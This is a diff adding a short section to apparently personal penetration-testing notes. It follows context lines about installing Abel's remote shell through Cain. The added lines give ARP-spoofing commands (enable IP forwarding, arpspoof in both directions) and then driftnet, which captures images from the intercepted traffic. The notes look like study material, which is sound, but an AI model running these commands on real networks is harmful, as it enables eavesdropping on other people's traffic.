@@ -18,3 +18,15 @@
 6. Install Abel (still on `Network`)
    * Press `Services` tab, right click and `install Abel`
    * Double click IP to refresh the view and go to `Abel` and `Shell`
+
+### arp-spoof
+1. Enable IP forwarding (lets the attacking host to send packets to both spoofed machines = traffic goes through the attacking host)
+   * `sudo echo 1 > /proc/sys/net/ipv4/ip_forward`
+2. Arp spoof - 1st direction
+   * `arpspoof -i eth1 -t <target1> -r <host/target2>`</br>
+   	  where `-r` -> poisong both hosts
+3. Arp spoof - 2nd direction
+   * `arpspoof -i eth1 -t <host/target2> -r <target1>`
+## driftnet - capture images from network traffic and display them in an X window; optionally, capture audio streams and play them.
+1. While arp-spoof is working
+    * `driftnet -i <interface>`
